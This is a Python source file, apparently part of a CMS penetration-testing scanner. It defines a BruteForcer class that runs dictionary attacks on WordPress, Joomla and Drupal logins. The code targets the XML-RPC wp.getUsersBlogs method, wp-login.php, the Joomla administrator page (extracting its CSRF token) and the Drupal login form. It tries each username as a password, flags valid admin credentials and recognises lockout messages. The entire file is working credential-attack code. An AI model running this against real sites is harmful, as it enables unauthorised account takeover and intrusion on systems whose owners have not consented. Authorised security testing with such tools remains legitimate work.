#! /usr/bin/env python3
import sys, urllib, re, http.cookiejar, ssl

# Import Objects
from .initialize import initializer
from .report import report
from .requester import requester

# Import Classes
from .threadscanner import MyHandler


# Perform brute-force, dictionary attacks
class BruteForcer:

    def __init__(self):
        self.force = None
        self.wpnoxmlrpc = True
        self.url = None
        self.usrlist = None
        self.pswlist = None
        self.dictattack = None

    # Read the wordlist and start brute-force attack
    def Start(self):
        if type(self.usrlist) is str:
            try:
                self.usrlist = [line.strip() for line in open(self.usrlist)]
            except IOError:
                self.usrlist = [self.usrlist]
        if type(self.pswlist) is str:
            try:
                self.pswlist = [line.strip() for line in open(self.pswlist)]
            except IOError:
                self.pswlist = [self.pswlist]

        if self.force is not None:
            msg = "Starting Brute Forcing: " + self.force
            report.message(msg)
            if self.force == 'W':
                if self.wpnoxmlrpc:
                    self.WPXMLRPC_brute()
                else:
                    self.WPrun()
            elif self.force == 'J':
                self.Joorun()
            elif self.force == 'D':
                self.Drurun()
            else:
                msg = "Not Valid Option Provided: use (W)ordpress, (J)oomla, (D)rupal"
                report.error(msg)
                sys.exit(1)

    # Find credentials via WordPress XML-RPC
    def WPXMLRPC_brute(self):
        msg = "Starting XML-RPC Brute Forcing"
        report.verbose(msg)
        for user in self.usrlist:
            self.pswlist.append(user)
            for pwd in self.pswlist:
                self.postdata = (
                    '<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
                    '<param><value><string>' + user +
                    '</string></value></param>'
                    '<param><value><string>' + pwd +
                    '</string></value></param></params></methodCall>')
                msg = "Trying Credentials: " + user + " " + pwd
                report.verbose(msg)
                requester.noredirect(self.url + '/xmlrpc.php', self.postdata)
                if re.search('<name>isAdmin</name><value><boolean>0</boolean>', requester.htmltext):
                    msg = "Valid Credentials! Username: " + user + " Password: " + pwd
                    report.high(msg)
                elif re.search('<name>isAdmin</name><value><boolean>1</boolean>', requester.htmltext):
                    msg = "Valid ADMIN Credentials! Username: " + user + " Password: " + pwd
                    report.high(msg)

    # Find credentials brute-forcing the wp-login.php page
    def WPrun(self):
        msg = "Starting Brute Forcing"
        report.verbose(msg)
        self.wplogin = "/wp-login.php"
        usersFound = []
        for user in self.usrlist:
            self.pswlist.append(user)  # try username as password
            for pwd in self.pswlist:
                self.postdata = {"log": user, "pwd": pwd, "wp-submit": "Log+In"}
                msg = "Trying Credentials: " + user + " " + pwd
                report.verbose(msg)
                requester.requestcookie(self.url + self.wplogin, self.postdata)
                if re.search('<strong>ERROR</strong>: Invalid username', requester.htmltext):
                    msg = "Invalid Username: " + user
                    report.message(msg)
                    break
                elif re.search('username <strong>(.+?)</strong> is incorrect.', requester.htmltext):
                    usersFound.append(user)
                elif re.search('ERROR.*blocked.*', requester.htmltext, re.IGNORECASE):
                    msg = "Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
                    report.error(msg)
                    return
                elif re.search('wordpress_logged_in_', str(requester.cookieJar), re.IGNORECASE):
                    msg = "Valid Credentials: " + user + " " + pwd
                    report.high(msg)
        # remove user
        self.pswlist.pop()

    # Find credentials brute-forcing the /administrator/index.php page
    def Joorun(self):
        # It manages token and Cookies
        self.joologin = "/administrator/index.php"
        self.JooValidCredentials = []
        for user in self.usrlist:
            # Get Token and Session Cookie
            requester.requestcookie(self.url + self.joologin, data=None)
            reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
            if reg.search(requester.htmltext) is not None:
                token = reg.search(requester.htmltext).group(1)
                self.pswlist.append(user)  # try username as password
                for pwd in self.pswlist:
                    # Send Post With Token and Session Cookie
                    self.postdata = {"username": user, "passwd": pwd, "option": "com_login", "task": "login", token: "1"}
                    msg = "Trying Credentials: " + user + " " + pwd
                    report.verbose(msg)
                    requester.requestcookie(self.url + self.joologin, self.postdata)
                    if re.findall(re.compile('Control Panel'),requester.htmltext):
                        msg = "Valid Credentials: " + user + " " + pwd
                        report.high(msg)
                self.pswlist.pop()  # remove user

    # Find credentials brute-forcing the /?q=user/login page
    def Drurun(self):
        self.drulogin = "?q=/user/login"
        self.DruValidCredentials = []
        for user in self.usrlist:
            self.pswlist.append(user)  # try username as password
            for pwd in self.pswlist:
                query_args = { "name": user, "pass": pwd, "form_id": "user_login_form" }
                msg = "Trying Credentials: " + user + " " + pwd
                report.verbose(msg)
                requester.noredirect(self.url + self.drulogin, data=query_args)
                if re.findall( re.compile( 'Sorry, too many failed login attempts|Try again later'), requester.htmltext):
                    msg = "Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
                    report.error(msg)
                if requester.status_code == 403 or requester.status_code == 303 :
                    msg = "Valid Credentials: " + user + " " + pwd
                    report.high(msg)
            self.pswlist.pop()  # remove user

bruter = BruteForcer()
